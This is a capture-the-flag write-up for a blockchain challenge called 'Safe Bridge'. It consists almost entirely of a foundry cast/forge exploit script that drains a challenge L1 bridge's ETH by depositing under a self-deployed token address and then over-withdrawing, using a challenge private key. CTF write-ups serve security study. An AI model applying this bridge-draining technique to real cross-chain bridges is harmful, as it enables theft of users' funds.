## Safe Bridge - Blockchian Problem - Writeup by Juno Im (@junorouse)

Our goal is draining the L1 bridge's ETH.

### Exploit Script

```
export L1=http://47.251.56.125:8545/AogMhbjrIOEkFiOxWzLtYNzd/l1
export L2=http://47.251.56.125:8545/AogMhbjrIOEkFiOxWzLtYNzd/l2
export CC=0xA27758E4d74BEa4361a0e3e97Ee8EB2F3856AD78
export PV=0xf7a05d38f4f0fc2f61cc3813c543cbdda2dcefcdbab03e372274bd60d3a05489
export L1BRIDGE=`cast call --rpc-url $L1 $CC 'BRIDGE() returns (address)'`
export L1WETH=`cast call --rpc-url $L1 $CC 'WETH() returns (address)'`
export L1MESSENGER=`cast call --rpc-url $L1 $CC 'MESSENGER() returns (address)'`
export L2WETH=0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000
export L2BRIDGE=0x420000000000000000000000000000000000baBe
export L2MESSENGER=0x420000000000000000000000000000000000CAFe
export UU=0xf8Df10eec8e321e7A4D7B72bf988C1412726A839
cast balance --rpc-url $L2 $UU

forge create --rpc-url $L2 --private-key=$PV ./test/Counter.t.sol:L2T
export L2T=0xEEcE6C701871B06b0AD7400408FB571669F4252E

cast send --rpc-url $L1 --private-key=$PV $L1WETH 'deposit()' --value 0.5ether
cast send --rpc-url $L1 --private-key=$PV $L1WETH 'approve(address,uint256)' $L1BRIDGE "99999999999999999999999999999999999999999999999999999999999999999"

cast call --rpc-url $L1 $L1WETH 'balanceOf(address) returns (uint256)' $UU
cast send --rpc-url $L1 --private-key=$PV $L1BRIDGE 'depositERC20(address,address,uint256)' $L1WETH $L2T 0.5ether

cast call --rpc-url $L2 $L2WETH 'balanceOf(address) returns (uint256)' $UU
cast call --rpc-url $L1 $L1WETH 'balanceOf(address) returns (uint256)' $L1BRIDGE
cast call --rpc-url $L1 $L1BRIDGE 'deposits(address,address) returns (uint256)' $L1WETH $L2T

cast send --rpc-url $L2 --private-key=$PV $L2WETH 'approve(address,uint256)' $L2BRIDGE "99999999999999999999999999999999999999999999999999999999999999999"

cast send --rpc-url $L2 --private-key=$PV $L2BRIDGE 'withdraw(address,uint256)' $L2WETH 0.5ether


cast send --rpc-url $L2 --private-key=$PV $L2BRIDGE 'withdraw(address,uint256)' $L2T 2.5ether
```
